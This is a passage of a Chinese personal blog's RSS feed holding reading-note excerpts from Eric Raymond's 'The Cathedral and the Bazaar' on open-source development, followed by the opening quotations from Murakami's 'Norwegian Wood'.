&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sun, 10 May 2015 00:00:00 +0000</pubDate><guid>tag:,2015-05-10:aboutme.html</guid><category>随笔</category></item><item><title>大教堂与集市</title><link>/The%20Cathedral%20and%20the%20Bazaar.html</link><description>&lt;p&gt;-----摘自埃里克·雷蒙《大教堂与集市》&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;黑客们则可以在不同机器上使用相同的工具，而不是每次都去做类似发明轮子和钻燧取火的事。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;UNIX和C还有其他的重要优势，它们都是KISS（Keep It Simple, Stupid）哲学下的产物。程序员可以很容易地在脑海中记忆并掌握整个C语言的逻辑结构（这可不同于之前或之后的大多数语言）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;与LISP和ITS具有巴洛克式令人着迷的复杂性相比，UNIX使用的工具看上去原始得可笑，“就像拿着石刀和穿着兽皮！”他们嘟囔道。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;他们的语言是BASIC，这种语言是如此简陋，以至于PDP-10信徒和UNIX爱好者都认为这简直不值得去蔑视。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Richard M. Stallman本人则毋庸置疑地成为了整个黑客文化部落的唯一精神领袖&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;从来没有稳定到可以发展出俚语、传说和轶事这类的公共传统文化。另外，由于一直没有出现类似UUCP或互联网这种真正能流行起来的网络技术，他们也没能发展出自己的网络部落&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;技术上的个人英雄主义时代已经终结，软件工业和新生的互联网，将会越来越多受微软这类大型企业控制。第一代UNIX黑客看上去已经垂垂老矣，多么令人沮丧的时光&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Linux最重要的特点不是技术上的，而是社会学上的。在Linux被开发出来之前，所有人都认为，如果软件复杂到操作系统这样的程度，就必须要有一个精心协作的团队，团队要比较小，而且紧密互动，不管是以前还是现在，这都是很典型的开发模式。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;达尔文“物竞天择”的选择机制，被选择对象则是开发者们所做的种种软件修改。让所有人吃惊的是，这种方式工作得很好&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Linux是颠覆性的，就在5年前（1991年），谁能想到，几千名散布在全球各地的开发者们，利用业余时间，仅仅是通过Internet这种脆弱的合作，就鬼斧神工般地造就了一个世界级的操作系统&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我一直在宣扬“小工具”、“快速原型法”以及“演化式编程”等UNIX信条。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;早发布、常发布、委托所有能委托的事、开放到几乎是混乱的程度，这些都令人感到惊讶不已。在Linux社区里，没有建筑大教堂那样的安静和虔诚，倒更像是一个乱糟糟的大集市，充满了各种不同的计划和方法，而既稳定又一致的一个操作系统就这么诞生了，这真是奇迹中的奇迹&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;好的软件作品，往往源自于开发者的个人需要。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;优秀的程序员知道写什么，卓越的程序员知道改写（和重用）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;"建设性懒惰”，他们知道人们要的是结果而不是勤奋，而从一个部分可行的方案开始，明显要比从零开始容易得多&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;虽然Linux中所有Minix代码最终都被移除或重写，但它在Linux成长初期确实起到了类似脚手架的作用&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;如果你有正确的态度，有趣的事情自然会找到&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;当你对一个程序不再感兴趣时，你最后的责任就是把它交给一个可以胜任的接棒者&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;拥有用户是一件很美好的事，这不仅表明你正在服务于某种需要，表明你做对了某些事，如果发展得当，他们还会成为你的开发合作者&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;给他们一点点鼓励，他们就会帮你查找问题、给出建议并帮助改善代码，这些比你自己做要快得多得多&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;这种做法的效力很容易被低估，事实上，连我们这些在开源世界里的人，都极大低估了这种做法的效力，也就是用户越多就越能有效对抗系统的复杂性&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我想，Linus最聪明和最有价值的成就其实不是构建出一个Linux内核，而是他发明的这种Linux开发模式。有一次我当面向他表达了这个看法，他笑了，平静地重复了他常说的话：“我基本上是个很懒的人，别人做事，我得名誉。”像狐狸那样懒，或者像Robert Heinlein曾经描绘的一个很有名的角色，太懒以至于无所不能。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;内核使用大教堂模式开发，工具箱(toolbox)使用集市模式开发，比如数据分析和可视化展现的商业化工具MATLAB就是这样&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Linus比其他任何人都更在意如何利用Internet杠杆促进合作，而且他真的做到了&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;他具备一种避免bug和防范开发走入死胡同的第六感，而且有一种能发现从A点到B点最省力路径的真本事，事实上，Linux的整个设计，都透露着这种特质，并反映了Linus那种本质上保守而简洁的设计&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Linus在持续不断地激励和回报着他的黑客/用户，用自我满足感激励他们，用持续改进（甚至每天都有改进）回报他&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;如果有足够多的beta测试者和合作开发者，几乎所有问题都会很快显现，然后自然有人会把它解决&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Linux模式下排错的两个部分（发现问题和修复问题）通常都很快&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;对集市模式而言则完全不同，在上千名合作开发者热切钻研每个新发布版本的情况下，你可以假定bug是浅显易找的，或者至少可以很快变得浅显易找。所以你会频繁发布以获取更多的修正，其副作用是良性的：即便发布中有些小问题，你也不会损失太多。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;他们有很大的兴趣使用软件、了解其工作原理、尝试解决遇到的问题并实际给出一个明显合理的解决办法。具备这些特点的人很有可能贡献出有价值的东西&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Linus定律也可被表述为“排错可以并行”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;但调试人员之间并不怎么需要协调，也就是说，增加调试人员并不会带来增加开发人员那样的二次方复杂性和管理成本&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;“用户越多，bug越多”是因为增加用户就会增加程序检验的方式。当用户是合作开发者时，这种效应会被放大&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;潜在用户要么选择上一个被标识为“稳定”的版本，要么冒着有bug的风险使用最新版本以获取新特性。这种策略还没有被Linux黑客们系统性地加以模仿&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;如果报告bug的用户对源码不关心，则其报告通常不会很有用。对源码不关心的用户，往往报告的都是表面症状，他们把自己的运行环境当成是理所当然的，他们不仅省略了重要的背景数据，而且很少给出重现bug的可靠方法。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;这里隐含的问题是开发者和测试者对程序有着不匹配的思维模式，测试者是从外往内看，程序员是从内往外看。对于不开放源码的软件开发，开发者与测试者往往局限于自己的角色，各说各话，都对对方倍感沮丧。开源开发打破了这种困境，由于大家都有真实的源码，开发者和测试者很容易发展出一个共享的表达模式并进行有效的交流。事实上，一个仅描述外部可见症状的bug报告，和一个直接关联到源码的分析型bug报告，对开发者而言简直是天壤之别。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;核心人员通常很少，最常见的是一个人，典型情况是一到三人&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;外围人员通常由beta测试者和潜在的贡献者组成（通常会达到数百人）。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;经延期的项目上增加人手，只会让项目更加延期。”更为一般地讲，Brooks定律指出，随着开发人员数目的增长，项目复杂度和沟通成本按照人数的平方增加，而工作成果只会呈线性增&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;bug很容易集中在不同人写的代码的交互接口上，沟通/协调的开销会随开发者间接口数的增加而增多，也就是说，问题规模和开发人员间的沟通路径数相关，即和人数的平方相关（更精确地讲，应该是N (N-1)/2，N代表开发者数目）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;外围开发者实际工作在分散而并行的子任务上，他们之间几乎不交流；代码修改和bug报告都会流向核心团队，只有在那个小的核心团队里才会有开销&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;对于复杂的bug，重点就要放在“随机”上了，这种情况下多人共同追踪bug远比少数几个人循序追踪要有效得多——即便这几个人的平均技能要高很多&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;聪明的数据结构配上愚笨的代码，远比反过来要好得多&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;让我看你的流程图但不让我看表，我会仍然搞不明白。给我看你的表，一般我就不再需要你的流程图了，表能让人一目了然&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;如果你把beta测试者当做最珍贵的资源对待，他们就会成为你最珍贵的资源。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;有趣的是，如果你发自内心地谦逊，并承认你欠别人很多，你将很快发现世界会这样对待你：他们认为是你发明了整个软件，而且你对自己的天赋有着得体的谦虚。我们可以看到这一点在Linus身上体现得有多好！&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;通常，那些最有突破性和最有创新力的解决方案来自于你认识到你对问题的基本观念是错的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;因为也许问题本身需要被重新定义&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;你的代码变得既好又简单，你就知道你做对了&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;开发和改进过程就可能成为排错过程的一个特例——修复软件原先在功能或概念上的“疏漏型bug”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我们都不是那种有浪漫原创精神的天才式人物，但是，大多数科学、工程以及软件开发都不是天才完成的，在青史上留名的往往是黑客&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;开发网关类软件时，尽可能不要干扰数据流，而且绝不要扔掉信息，除非接收方强迫你这么做&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;英语大约有50%的冗余度，很不适宜作为控制语法的模型。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;是否便于人类使用要比是否节省计算资源更重要。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;语法糖是指为计算机语言添加某种不会影响语言功能的成分，但却使其更易用一些，目的是增强代码可读性&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;显然，你不可能从零开始实施集市模式。可以用集市模式测试、排错和完善项目，但以集市模式从零开始一个项目是非常困难的。Linus没有这么试过，我也没有。开发者社区从成立伊始，就需要一个可以运行和测试的东西&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;当开始建设社区的时候，你需要拿出一个像样的承诺。程序此时并不需要特别好，它可以简陋、有错、不完整，文档可以少得可怜。但它至少要做到：(a)能运行，(b)让潜在的合作开发者相信，这个软件在可预见的未来，能演变成一个非常棒的东西&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;一个协调者是否拥有卓越的原创设计能力，并不是项目成败的决定性因素，但他是否能识别出别人的优秀创意，则一定是最关键的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;在应该保持软件健壮性和简单性的时候，你往往下意识把它弄得既华丽又复杂&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;fetchmail项目之所以能成功，相信部分原因是我限制了表现自己聪明的倾向。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;为了建立一个开发社区，你需要吸引人们，让他们对你做的事感兴趣，让他们乐于看到自己的贡献。一些技巧可能有助于实现这些，但远远不是全部，你的人格特征也很重要&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;为了让集市模式运转，哪怕有一点点的人格魅力，都会对你大有裨益&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;最好的程序一开始只是作者对自己每天遭遇问题的个人解决方案，程序流传开来则是因为作者遇到的问题成了一大类用户的典型问题&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;想要解决一个有趣的问题，先去找一个让你感兴趣的问题。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;一个在封闭项目中只靠自己的开发者，将远远落后于这种开发者：他们知道如何创建一个开放的、有改进能力的环境，在这个环境中，上百人（甚至上千人）反馈并提供设计空间拓展、代码贡献、bug定位以及软件的其他改进。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Linux是第一个有意识并成功将整个世界作为其人才库的项目&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Internet普及之后，Linus是学会如何运用新规则的第一人&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;另一个非常重要的因素是领导风格的形成和协作机制的建立，这是吸引合作开发者加入项目的关键&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Internet可以看成是无政府主义者的天堂&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Linux世界的运转，在很多方面像一个自由市场，或者像一个由很多利己个体组成的生态系统，系统中每个个体都追求自身效用的最大化，在其共生的过程中，能够自然建立起一种具备自我纠错能力的秩序，这种秩序比任何集中式规划都要精妙和高效。这里，正是“共识原则”达成的地方。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Linux黑客们致力于最大化的“效用函数”，其目的并不是经典意义上的经济价值，而是自我满足和黑客声望这些无形的东西&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;即“利他”本身是“利他者”自我满足的外在表现&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;个人在团体中声望的提升是志愿者活动背后的基本驱动力。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Linus成功地将自己置于项目看门人的地位——大多数开发工作是他人完成的，他不断培养大家对这个项目的兴趣直到它能够自我维持下去，这表现出他对Kropotkin“共识原则”的敏锐领会。用这种“准经济”（quasi-economic）视角来观察Linux世界，有助于我们理解“共识原则”是如何应用的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;为什么Linux黑客们还要写出这么多文档？很明显，Linux自由的“egoboo”市场比那些有重金投资的商业软件公司，能够产生更有道德、更利他的行为&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;如果开发协调者有一个至少像Internet这样好的沟通媒介，并且知道如何不靠强制来领导，那么多人合作必然强于单兵作战。我认为开源软件的未来会越来越属于那些懂得如何玩转Linus定律的人，&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我认为冲在开源软件最前沿的人，正是凭借自己的眼光和才华而发起项目，并通过构建有效的志愿者社区将之发扬光大。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;不是因为“合作是道德正确的”或“软件闭锁是道德错误的”（也许你相信后者，但Linus和我不这样认为），而仅仅是由于闭源世界不能赢得一场与开源社区之间的不断演化的军备竞赛，因为后者可以在一个问题上投入比前者多几个数量级的熟练技术工时&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;软件开发真正需要的是持久的努力和客户预期在产品上持续投资的程度，而不是到底有多少人在锅中扔入一块骨头然后让它慢慢炖着&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;马其诺防线用来形容表面看似坚固而实际没有价值的东西&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;开源开发者是志愿者，是因为兴趣和能力（能否对项目有所贡献）自主选择的（即便他们因开源工作领取薪水，这也依然适用），志愿者精神倾向于自发去关心资源问题的“解决”，他们会把自己的资源带到工作中，这里几乎没有传统意义上“防守”的必要&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;无论如何，在一个廉价PC和快速Internet连接的世界里，我们发现始终如一真正有限的资源是技术人员的关注，开源项目如果失败了，根本不会是因为机器、网络或办公场地，它们死掉的唯一原因就是开发者们不再感兴趣了&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;开源之所以成功，部分原因是开源文化只接受编程人员中那最有才华的5%。她将自己的大部分时间都花在了组织部署其他的95%，并因而第一手见证到那广为人知的差异：最有才华的程序员和那些刚刚及格的程序员之间，生产率能相差100倍。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;开源社区最强大的一个长项就是非中心化的同行评审，所有致力于细节不被疏漏的传统方法，都无法和它相比。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我们创造性的游戏已经在技术上、市场占有率上、观念认同上以令人震惊的速度获得了增长，我们不仅证明了我们可以做出更好的软件，而且证明了快乐也是一种资产。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我能提供用来作为结束语的最激进的观点，已经不再是“开源统领软件世界”这样的愿景了，毕竟那些很严肃的西装革履的人，也认为这种观点有些道理了&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;乐趣预示着效率&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;快乐、幽默和玩兴是真正的资产，前面我之所以写“快乐部落”（happy horde）并不是为了首字母押韵，而用一只憨态可掬的企鹅作为Linux吉祥物也绝不仅仅是为了搞笑。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;网景的执行副总裁和首席技术官Eric Hahn给我发了一封电子邮件：“我代表网景公司所有员工，感谢您帮助我们走到这一步，您的思考和写作，对我们的决定有着至关重要的启发意义。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;“玩”是创造性活动中最具经济效能的工作模式&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Fri, 08 May 2015 00:00:00 +0000</pubDate><guid>tag:,2015-05-08:The Cathedral and the Bazaar.html</guid><category>读书</category></item><item><title>挪威的森林</title><link>/norwegian-wood.html</link><description>&lt;p&gt;&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;*摘自村上春树《挪威的森林》(林少华版）&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;*&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;记忆这东西真有些不可思议。实际身临其境的时候，几乎未曾意识到那片风景，未曾觉得它有什么撩人情怀之处，&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我这人，无论对什么，都务必形诸文字，否则就无法弄得水落石出。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;"嗳，渡边君，真喜欢我？"&lt;br /&gt;
"那还用说？"我回答。&lt;br /&gt;
"那么，可依得我两件事？"&lt;br /&gt;
"三件也依得"  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;一切都清晰得历历如昨的时候，反而不知从何处着手，就像一张详尽的地图，有时反倒因其过于详尽而不便于使用&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;直子当然知道，知道她在我心目中的记忆迟早要被冲淡。也惟其如此，她才强调说：希望你能记住我，记住我曾这样存在过。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;想到这里，我就悲哀得难以自禁。因为，直子连爱都没爱过我的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;就日常生活这点来说，右翼也罢、左翼也罢、伪善也罢、罪恶也罢、并无多大区别。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;他有那么一种能力，可以准确无误地捕捉住气氛的变化，，从而浑洒自如地因势利导。另外他还有一种颇为可贵的才能，可以从对方并不甚有趣的谈话中抓出有趣的部分来。因此，每次与他交谈，我就觉得自己俨然是个妙趣横生的人，在欢度妙趣横生的人生。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;然而他决非社交式人物。在学校里，除我以外他同谁也合不来。我总不明白，此等头脑机敏、谈吐潇洒之人为何不向更为广阔的世界施展才华，而对只有三个人的小天地感到满足&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;诉诸语言之后确很平凡，但当时的我并不是将其作为语言，而是作为一团薄雾样的东西来用整个身心感受的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我们两人漫无目标地在东京街头走来转去。上坡，过河，穿铁道口，只管走个没完。没有明确的目的地，反正走路即可。仿佛举行一种拯救灵魂的宗教仪式般地，我们专心致志地大走特走。下雨就撑伞走。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;她所希求的并非我的体温，而是某人的体温。而我只能是我，于是我觉得有些愧疚。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;无论班里还是宿舍院内，我没发现一个人喜欢这类小说。他们读的大多是高桥和巳、大江健三郎和三岛由纪夫，或者法国当代作家。这样，说话当然说不到一起，我只能一个人默默阅读&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;兴之所至，我便习惯性地从书架中抽出《了不起的盖茨比》，信手翻开一页，读上一段，一次都没让我失望过，没有一页使人兴味索然。何等妙不可言的杰作！我真想把其中的妙处告诉别人。但环视四周，竟无一个人读过《了不起的盖茨比》，甚至连想读的人都没有&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;"若是通读三遍《了不起的盖茨比》的人，倒像是可以成为我的朋友。"&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;对死后不足三十年的作家，原则上是不屑一顾的。那种书不足为信。不是说我不相信现代文学。我只是不愿意在阅读未经过时间洗礼的书籍方面浪费时间。人生短暂。如果读的东西和别人雷同，思考方式也只能和别人雷同。乡巴佬、小市民才那样。有识之士不会如法炮制，取羞于人。——永泽&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;他们害怕因缺课过多而拿不到学分。此等人物居然也高喊什么解散大学，想来令人喷饭。如此卑劣小人，惟有见风使舵投敌变节之能事。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
